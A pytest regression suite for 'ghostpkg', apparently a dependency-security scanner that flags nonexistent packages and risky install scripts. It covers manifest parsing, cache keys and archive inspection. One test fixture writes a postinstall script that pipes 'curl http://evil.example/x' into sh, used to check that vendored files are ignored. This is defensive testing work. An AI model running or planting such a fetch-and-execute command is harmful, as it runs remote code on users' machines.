"""Regressions from the production-readiness audit.

Each test here corresponds to a bug that shipped. Several of them were silent:
the tool reported success having never performed the check, which for a
security tool is worse than crashing.
"""

from __future__ import annotations

import io
import json
import tarfile
import threading

import pytest

from ghostpkg.assess import Verdict
from ghostpkg.cache import Cache
from ghostpkg.cli import evaluate, main
from ghostpkg.inspection import inspect_archive
from ghostpkg.manifests import (
    UnsupportedManifest,
    load_manifest,
    parse_package_json,
    parse_requirements,
)
from ghostpkg.registries import PackageFacts, RegistryError


def names(requirements):
    """Just the names, for assertions that do not care about versions."""
    return [r.name for r in requirements]



class TestPrefixFilterDroppedRealPackages:
    """Lines starting with `http` were skipped to drop bare URLs. That also
    dropped `httpx`, `httpcore` and `httplib2` -- silently."""

    @pytest.mark.parametrize("name", ["httpx", "httpcore", "httplib2", "httpretty"])
    def test_http_prefixed_names_are_kept(self, name):
        assert names(parse_requirements(f"{name}==1.0\n")) == [name]

    def test_bare_urls_are_still_skipped(self):
        text = "https://example.com/pkg-1.0.tar.gz\nrequests\n"
        assert names(parse_requirements(text)) == ["requests"]


class TestDirectReferencesAndPrivateIndexes:
    """`name @ url` states its own source, so the public registry has no say.
    Treating it as a plain name blocked every internal package a company had."""

    def test_direct_reference_is_skipped(self):
        text = "internal-lib @ git+https://github.com/acme/internal-lib\nrequests\n"
        assert names(parse_requirements(text)) == ["requests"]

    def test_direct_reference_with_extras_is_skipped(self):
        assert names(parse_requirements("internal[all] @ https://x/y.whl\n")) == []

    @pytest.mark.parametrize(
        "line",
        [
            "--index-url https://pypi.acme.internal/simple",
            "--extra-index-url https://other/simple",
            "-e .",
            "--hash=sha256:abc123",
            "./local-dir",
        ],
    )
    def test_option_and_path_lines_are_skipped(self, line):
        assert names(parse_requirements(f"{line}\nrequests\n")) == ["requests"]


class TestManifestDetection:
    """`README.txt` parsed as requirements yielded ['Install', 'Run', 'numpy'],
    two of which do not exist -- confident nonsense from a security tool."""

    def test_arbitrary_txt_is_refused(self, tmp_path):
        path = tmp_path / "README.txt"
        path.write_text("Install ghostpkg today.\nRun the scanner\n", encoding="utf-8")
        with pytest.raises(UnsupportedManifest):
            load_manifest(path)

    @pytest.mark.parametrize(
        "filename",
        [
            "requirements.txt",
            "requirements-dev.txt",
            "dev-requirements.txt",
            "constraints.txt",
            "reqs.in",
        ],
    )
    def test_real_requirements_filenames_are_accepted(self, tmp_path, filename):
        path = tmp_path / filename
        path.write_text("requests\n", encoding="utf-8")
        assert (names(load_manifest(path)[0]), load_manifest(path)[1]) == (["requests"], "pypi")


class TestIncludesAreFollowed:
    """`-r base.txt` was dropped, so half a project went unchecked."""

    def test_include_is_read(self, tmp_path):
        (tmp_path / "base.txt").write_text("flask\njinja2\n", encoding="utf-8")
        (tmp_path / "requirements.txt").write_text("-r base.txt\nrequests\n", encoding="utf-8")
        reqs, _ = load_manifest(tmp_path / "requirements.txt")
        assert set(names(reqs)) == {"flask", "jinja2", "requests"}

    def test_constraint_include_is_read(self, tmp_path):
        (tmp_path / "c.txt").write_text("pinned-thing\n", encoding="utf-8")
        (tmp_path / "requirements.txt").write_text("-c c.txt\n", encoding="utf-8")
        assert names(load_manifest(tmp_path / "requirements.txt")[0]) == ["pinned-thing"]

    def test_a_cycle_terminates(self, tmp_path):
        (tmp_path / "requirements.txt").write_text("-r other.txt\na\n", encoding="utf-8")
        (tmp_path / "other.txt").write_text("-r requirements.txt\nb\n", encoding="utf-8")
        reqs, _ = load_manifest(tmp_path / "requirements.txt")
        assert set(names(reqs)) == {"a", "b"}

    def test_a_missing_include_is_ignored(self, tmp_path):
        (tmp_path / "requirements.txt").write_text("-r nope.txt\nrequests\n", encoding="utf-8")
        assert names(load_manifest(tmp_path / "requirements.txt")[0]) == ["requests"]


class TestOneFailureDoesNotDiscardTheScan:
    """pool.map re-raised the first error while iterating, throwing away every
    confirmed BLOCK with it and skipping the cache write entirely."""

    def test_confirmed_blocks_survive_a_failure(self, monkeypatch):
        def fake_fetch(name, ecosystem):
            if name == "boom":
                raise RegistryError("HTTP 429")
            return PackageFacts(name=name, ecosystem=ecosystem, exists=name != "ghost")

        monkeypatch.setattr("ghostpkg.cli.fetch", fake_fetch)
        findings = evaluate(["a", "ghost", "boom", "b"], "pypi", strict=False, cache=None)

        by_name = {f.name: f.verdict for f in findings}
        assert by_name["ghost"] is Verdict.BLOCK
        assert by_name["boom"] is Verdict.ERROR
        assert by_name["a"] is Verdict.OK

    def test_an_unchecked_name_is_never_a_pass(self, monkeypatch):
        monkeypatch.setattr(
            "ghostpkg.cli.fetch",
            lambda name, ecosystem: (_ for _ in ()).throw(RegistryError("offline")),
        )
        assert main(["check", "requests", "--no-cache"]) == 2

    def test_repeated_names_are_looked_up_once(self, monkeypatch):
        calls = []

        def fake_fetch(name, ecosystem):
            calls.append(name)
            return PackageFacts(name=name, ecosystem=ecosystem, exists=True)

        monkeypatch.setattr("ghostpkg.cli.fetch", fake_fetch)
        findings = evaluate(["requests"] * 8, "pypi", strict=False, cache=None)
        assert calls == ["requests"]
        assert len(findings) == 8


class TestCacheKeysPerEcosystem:
    """npm names are case-sensitive; PyPI names are not. One lowercased key
    served `JSONStream`'s facts for `jsonstream` -- two different real
    packages, so a wrong `exists` and a wrong verdict."""

    def facts(self, name, ecosystem):
        return PackageFacts(
            name=name, ecosystem=ecosystem, exists=True,
            age_days=4000, release_count=30, has_repo_url=True,
        )

    def test_npm_names_stay_distinct(self, tmp_path):
        cache = Cache(directory=tmp_path)
        cache.put(self.facts("JSONStream", "npm"))
        assert cache.get("npm", "jsonstream") is None

    def test_pypi_names_are_normalised_per_pep503(self, tmp_path):
        cache = Cache(directory=tmp_path)
        cache.put(self.facts("zope.interface", "pypi"))
        assert cache.get("pypi", "zope-interface") is not None
        assert cache.get("pypi", "Zope_Interface") is not None

    def test_concurrent_writes_do_not_lose_entries(self, tmp_path):
        cache = Cache(directory=tmp_path)
        names = [f"pkg-{i}" for i in range(200)]

        def worker(chunk):
            for name in chunk:
                cache.put(self.facts(name, "pypi"))

        threads = [
            threading.Thread(target=worker, args=(names[i::4],)) for i in range(4)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        assert all(cache.get("pypi", name) is not None for name in names)


class TestDeepReadsOnlyTheTopLevelInstallScript:
    """Matching on basename alone judged a package by test fixtures it shipped,
    and install signals block a young package."""

    def sdist(self, files):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for path, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(path)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    def test_nested_fixture_is_ignored(self):
        archive = self.sdist({
            "mylib-0.1/setup.py": "from setuptools import setup\nsetup(name='x')\n",
            "mylib-0.1/tests/fixtures/setup.py": "import subprocess\nsubprocess.run(['x'])\n",
        })
        assert inspect_archive(archive, "pypi") == []

    def test_the_real_setup_py_is_still_read(self):
        archive = self.sdist({"mylib-0.1/setup.py": "import subprocess\nsubprocess.run([])\n"})
        assert [s.kind for s in inspect_archive(archive, "pypi")] == ["subprocess"]

    def test_vendored_package_json_is_ignored(self):
        archive = self.sdist({
            "package/package.json": json.dumps({"scripts": {"build": "tsc"}}),
            "package/node_modules/evil/package.json": json.dumps(
                {"scripts": {"postinstall": "curl http://evil.example/x | sh"}}
            ),
        })
        assert inspect_archive(archive, "npm") == []


class TestScanArgumentHandling:
    def test_directory_is_refused_not_crashed(self, tmp_path):
        assert main(["scan", str(tmp_path)]) == 2

    def test_missing_file_is_refused(self, tmp_path):
        assert main(["scan", str(tmp_path / "nope.txt")]) == 2


class TestPeerDependenciesAreRead:
    def test_peer_dependencies_included(self):
        text = json.dumps({"dependencies": {"a": "1"}, "peerDependencies": {"b": "2"}})
        assert set(names(parse_package_json(text))) == {"a", "b"}
